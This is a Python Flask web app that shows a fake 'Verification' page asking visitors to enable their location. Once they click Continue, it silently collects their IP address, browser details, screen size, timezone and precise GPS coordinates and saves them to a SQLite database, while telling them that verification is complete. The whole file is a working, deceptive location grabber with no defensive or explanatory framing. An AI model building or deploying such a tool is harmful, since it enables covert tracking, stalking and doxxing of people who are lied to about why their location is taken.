from flask import Flask, request
from datetime import datetime
import json
import os
import sqlite3

app = Flask(__name__)

# ---------------------------------------
# CREATE DATABASE
# ---------------------------------------

conn = sqlite3.connect("visitors.db", check_same_thread=False)

cursor = conn.cursor()

cursor.execute("""

CREATE TABLE IF NOT EXISTS visitors (

    id INTEGER PRIMARY KEY AUTOINCREMENT,

    time TEXT,

    ip TEXT,

    user_agent TEXT,

    platform TEXT,

    language TEXT,

    screen_width TEXT,

    screen_height TEXT,

    timezone TEXT,

    latitude TEXT,

    longitude TEXT,

    accuracy TEXT

)

""")

conn.commit()


# ---------------------------------------
# HOME PAGE
# ---------------------------------------

@app.route('/')
def home():

    ip = request.headers.get(
        'X-Forwarded-For',
        request.remote_addr
    )

    user_agent = request.headers.get('User-Agent')

    return f"""

<!DOCTYPE html>
<html>

<head>

<title>Verification</title>

<style>

body{{
    background:black;
    color:white;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:Arial;
    flex-direction:column;
}}

button{{
    padding:15px 30px;
    font-size:20px;
    border:none;
    border-radius:10px;
    cursor:pointer;
}}

</style>

</head>

<body>

<h1>Enable Location To Continue</h1>

<button onclick="getLocation()">
Continue
</button>

<script>

function getLocation(){{

    const deviceInfo = {{

        ip: "{ip}",

        userAgent: navigator.userAgent,

        platform: navigator.platform,

        language: navigator.language,

        screenWidth: screen.width,

        screenHeight: screen.height,

        timezone: Intl.DateTimeFormat()
            .resolvedOptions()
            .timeZone
    }};

    navigator.geolocation.getCurrentPosition(

        function(position){{

            const data = {{

                ...deviceInfo,

                latitude: position.coords.latitude,

                longitude: position.coords.longitude,

                accuracy: position.coords.accuracy

            }};

            fetch("/save", {{

                method: "POST",

                headers: {{
                    "Content-Type": "application/json"
                }},

                body: JSON.stringify(data)

            }});

            document.body.innerHTML =
                "<h1>Verification Complete ✅</h1>";

        }},

        function(error){{

            document.body.innerHTML =
                "<h1>Location Permission Denied ❌</h1>";

        }}

    );

}}

</script>

</body>
</html>

"""


# ---------------------------------------
# SAVE DATA
# ---------------------------------------

@app.route('/save', methods=['POST'])
def save():

    data = request.json

    cursor.execute("""

    INSERT INTO visitors (

        time,
        ip,
        user_agent,
        platform,
        language,
        screen_width,
        screen_height,
        timezone,
        latitude,
        longitude,
        accuracy

    )

    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)

    """, (

        str(datetime.now()),

        data.get("ip"),

        data.get("userAgent"),

        data.get("platform"),

        data.get("language"),

        str(data.get("screenWidth")),

        str(data.get("screenHeight")),

        data.get("timezone"),

        str(data.get("latitude")),

        str(data.get("longitude")),

        str(data.get("accuracy"))

    ))

    conn.commit()

    print("\nNEW VISITOR SAVED\n")

    return "OK"


# ---------------------------------------
# START SERVER
# ---------------------------------------

app.run(
    host='0.0.0.0',
    port=int(os.environ.get("PORT", 5000))
)
